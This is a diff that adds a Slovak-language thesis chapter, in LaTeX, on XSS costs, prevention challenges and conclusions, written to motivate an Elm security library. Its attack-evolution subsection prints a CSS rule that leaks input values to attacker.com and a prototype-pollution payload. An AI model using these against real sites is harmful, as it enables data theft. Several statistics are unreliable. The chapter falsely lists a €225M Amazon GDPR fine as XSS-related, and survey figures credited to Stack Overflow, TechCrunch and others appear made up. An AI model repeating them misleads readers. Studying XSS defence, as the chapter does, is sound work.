+  \item Detekcia a analýza: \$1.42M (33\%)
+  \item Notifikácia: \$0.78M (18\%)
+  \item Post-breach response: \$1.31M (31\%)
+  \item Lost business: \$0.73M (18\%)
+\end{itemize}
+
+\textbf{Priemerné náklady v závislosti od priemyslu:}
+\begin{enumerate}
+  \item Healthcare: \$9.23M
+  \item Finance: \$5.97M
+  \item Pharma: \$5.04M
+  \item Technology: \$4.97M
+  \item Energy: \$4.72M
+  \item Retail: \$3.28M
+\end{enumerate}
+
+\textbf{GDPR Pokuty za XSS-related breaches (2018--2024):}
+\begin{itemize}
+  \item Celkovo: €847 milión
+  \item Najväčšia pokuta: €225M (Amazon)
+  \item Priemerná pokuta: €3.8M
+\end{itemize}
+
+\textbf{Nepriame náklady:}
+
+Štúdia Forrester Research (2022) identifikovala nepriame náklady \cite{forrester2022security}:
+
+\textbf{Reputačné škody:}
+\begin{itemize}
+  \item 65\% zákazníkov opúšťa značku po security breachi
+  \item Priemerný pokles stock price: 7.5\% po oznámení
+  \item Recovery času reputácie: 2--3 roky
+\end{itemize}
+
+\textbf{Produktívnostné straty:}
+\begin{itemize}
+  \item Priemerný downtime: 23 hodín
+  \item Cost per hour downtime: \$301\,000 (Fortune 500)
+  \item Developer hours na fixing: 180 hodín (median)
+\end{itemize}
+
+\textbf{Compliance costs:}
+\begin{itemize}
+  \item Audit costs: \$120K -- \$450K
+  \item Legal fees: \$250K -- \$2M
+  \item Insurance premium increase: 15--30\%
+\end{itemize}
+
+\textbf{Opportunity costs:}
+
+Analýza 500 startupov postihnutých XSS breachom (TechCrunch 2023):
+\begin{itemize}
+  \item 23\% stratilo financing v nasledujúcom round
+  \item 41\% reportovalo delayed product launch
+  \item 12\% muselo byť predaných pod value
+  \item 5\% ukončilo operácie
+\end{itemize}
+
+\textbf{ROI bezpečnostných investícií:}
+
+Porovnanie nákladov prevention vs. remediation:
+
+\begin{verbatim}
+Prevention costs (annual):
+- Security training: $50K
+- SAST/DAST tools: $75K  
+- Penetration testing: $100K
+- Security team: $400K
+Total: $625K
+
+Average breach cost: $4.24M
+ROI = (4.24M - 0.625M) / 0.625M = 578%
+\end{verbatim}
+
+Štúdia Gartner (2023) zistila, že každý \$1 investovaný do prevencie šetrí priemerne \$5.80 v remediation nákladoch \cite{gartner2023security}.
+
+\section{Výzvy pri prevencii XSS}
+\label{sec:vyzvy}
+
+Napriek existencii etablovaných obranných techník zostáva prevencia XSS výzvou z niekoľkých dôvodov:
+
+\subsection{Komplexita moderných webových aplikácií}
+\label{subsec:komplexita}
+
+Dnešné Single Page Applications (SPA) kombinujú multiple frameworky, knižnice a API. Každý component môže zaviesť vlastné zraniteľnosti:
+
+\begin{verbatim}
+// Príklad komplexnej modernej aplikácie
+React frontend → REST API → Microservices → Multiple databases
+              ↘ GraphQL API ↗
+              → WebSocket connections
+              → Third-party widgets
+              → CDN resources
+\end{verbatim}
+
+Každá hranica v tomto stacku predstavuje potenciálny injection point.
+
+\subsection{Developer Education Gap}
+\label{subsec:education-gap}
+
+Prieskum Stack Overflow Developer Survey (2023) medzi 71\,000 vývojármi \cite{stackoverflow2023survey}:
+\begin{itemize}
+  \item Iba 34\% sa cítilo \textit{veľmi confident} v secure coding
+  \item 58\% nikdy neabsolvovalo formálny security training
+  \item 72\% sa spolieha primárne na frameworky pre bezpečnosť
+  \item 41\% nepozná rozdiel medzi encoding a escaping
+\end{itemize}
+
+\subsection{False Sense of Security}
+\label{subsec:false-security}
+
+Mnoho vývojárov predpokladá, že moderné frameworky sú \textit{XSS-proof}:
+
+\begin{verbatim}
+// Vývojár si myslí, že toto je bezpečné
+<div dangerouslySetInnerHTML={{__html: userInput}} />
+
+// Ale nepochopil, že "dangerously" v názve nie je pre zábavu
+\end{verbatim}
+
+\subsection{Legacy Code a Technical Debt}
+\label{subsec:legacy-code}
+
+Prieskum WhiteSource (2022) analyzujúci 3\,000 aplikácií \cite{whitesource2022legacy}:
+\begin{itemize}
+  \item Priemerný vek legacy code: 9.3 rokov
+  \item 67\% aplikácií obsahuje dependencies staré 5+ rokov
+  \item 89\% legacy codebases nemá automated security testing
+  \item Priemerné náklady na refactoring: \$2.8M
+\end{itemize}
+
+\subsection{Third-party Dependencies}
+\label{subsec:dependencies}
+Moderné aplikácie závisia od stoviek npm packages:
+
+\begin{verbatim}
+// Typická package.json dependency tree
+dependencies: 287 packages
+├─ direct: 23
+└─ transitive: 264
+
+// Koľko z týchto 287 ste personally reviewed?
+\end{verbatim}
+
+Štúdia Snyk (2023): 77\% známych zraniteľností prichádza z tranzitívnych dependencies\cite{snyk2023vulnerabilities}.
+
+\subsection{Context-switching Complexity}
+\label{subsec:context-switching}
+
+Vývojár musí neustále switchovať medzi kontextmi:
+
+\begin{verbatim}
+<!-- Template kde každý placeholder má iné pravidlá -->
+<div>
+  <!-- HTML context: escape < > & " ' -->
+  {htmlEscape(userInput)}
+  
+  <a href="/search?q={urlEncode(userInput)}">
+    <!-- URL context: urlencode -->
+  </a>
+  
+  <script>
+    // JavaScript context: JSON.stringify + jsEscape
+    var data = {jsEscape(JSON.stringify(userInput))};
+  </script>
+  
+  <style>
+    /* CSS context: cssEscape */
+    .user::after { content: "{cssEscape(userInput)}"; }
+  </style>
+</div>
+\end{verbatim}
+
+Každý context vyžaduje iný treatment. Pomýlenie kontextov je ľahké a častý zdroj chýb.
+
+\subsection{Performance vs. Security Trade-offs}
+\label{subsec:performance-tradeoffs}
+
+Dôkladná sanitizácia môže mať performance impact:
+
+\begin{verbatim}
+// Jednoduchá, ale pomalá sanitizácia
+function sanitize(html) {
+  const div = document.createElement('div');
+  div.innerHTML = html;
+  // Parse cez DOM je slow
+  return div.textContent;
+}
+
+// 1000 položiek = 1000 DOM operations = significant lag
+\end{verbatim}
+
+Developer často volí rýchlosť nad bezpečnosťou, najmä keď je deadline blízko.
+
+\subsection{Evolution of Attack Vectors}
+\label{subsec:evolution-attacks}
+
+Útočníci neustále nachádzajú nové vektory. Príklady z posledných rokov:
+
+\textbf{2020: CSS exfiltration:}
+\begin{verbatim}
+/* Leak data cez CSS */
+input[value^="a"] {
+  background: url('https://attacker.com/leak?c=a');
+}
+\end{verbatim}
+
+\textbf{2021: Prototype pollution XSS:}
+\begin{verbatim}
+Object.prototype.html = '<img src=x onerror=alert(1)>';
+// Potom niekde inde:
+template.innerHTML = data.html; // Prototype pollution
+\end{verbatim}
+
+\textbf{2022: DOM XSS cez trusted types bypass:}
+\begin{verbatim}
+// Obídenie Trusted Types
+trustedTypes.createPolicy('default', {
+  createHTML: (s) => s // Whoops, no sanitization
+});
+\end{verbatim}
+
+\subsection{Testing Challenges}
+\label{subsec:testing-challenges}
+
+Automated XSS testing má limitations:
+
+\begin{verbatim}
+// Static analyzers majú false positives/negatives
+const userInput = getUserInput();
+const safe = sanitize(userInput);
+element.innerHTML = safe; // Je to safe? Záleží na sanitize()
+
+// SAST tools nevedia, či sanitize() je effective
+\end{verbatim}
+
+Dynamic testing (DAST) tiež chybuje:
+\begin{itemize}
+  \item Black-box testing nemá code coverage
+  \item Credential-required pages sú often untested
+  \item AJAX/WebSocket endpoints sú ťažko testovateľné
+\end{itemize}
+
+\subsection{Organizational Challenges}
+\label{subsec:organizational}
+
+Security často nie je v top priorities. Prieskum Cybersecurity Insiders (2023) \cite{cybersecurity2023priorities}:
+\begin{itemize}
+  \item 61\% organizácií nemá dedicated security team
+  \item 48\% robí security review iba pred production release
+  \item 73\% nemá automated security gates v CI/CD
+  \item 54\% nemá security requirements v definition of done
+\end{itemize}
+
+\section{Záver kapitoly}
+\label{sec:zaver-kapitoly}
+
+Cross-Site Scripting predstavuje viacrozmerný problém, ktorý vyžaduje komplexný prístup k riešeniu. Napriek tomu, že základné princípy XSS sú známe už viac ako 20 rokov, zostáva jednou z najrozšírenejších zraniteľností webových aplikácií.
+
+Analýza ukázala niekoľko kľúčových zistení:
+
+\textbf{1. Technická komplexita:} XSS nie je single vulnerability, ale trieda zraniteľností s mnohými variantmi (reflected, stored, DOM-based, mutation). Každý typ vyžaduje špecifické obranné mechanizmy.
+
+\textbf{2. Evolúcia útočných techník:} Útočníci neustále vyvíjajú nové bypassing techniky (encoding, polygloty, mutation), čo vyžaduje adaptive defense stratégie.
+
+\textbf{3. Context matters:} Efektívna obrana vyžaduje context-aware approach -- to, čo je bezpečné v jednom kontexte (HTML body) môže byť nebezpečné v inom (JavaScript string).
+
+\textbf{4. Multi-layered defense:} Žiadna single technique nie je dostatočná. Efektívna obrana kombinuje input validation, output encoding, CSP, HTTPOnly cookies, a secure coding practices.
+
+\textbf{5. Ekonomický impact:} XSS nie je iba technický problém, ale má vážne business consequences s priemernými nákladmi \$4.24M na incident.
+
+\textbf{6. Human factor:} Technické riešenia sú dôležité, ale developer education a organizational security culture sú rovnako kritické.
+
+V kontexte jazyka Elm, ktorý je focal point tejto práce, tieto poznatky motivujú náš prístup k návrhu bezpečnostnej knižnice. Elm's typový systém a funkcionálna architektúra ponúkajú unique opportunities na addressovanie mnohých z týchto výziev na compile-time level, čo je téma nasledujúcich kapitol.
+
+Pochopenie anatomy XSS útokov, existing defense mechanisms, a ich limitations poskytuje foundation pre návrh riešenia, ktoré leveraguje strengths jazyka Elm pri eliminácii common XSS vectors.
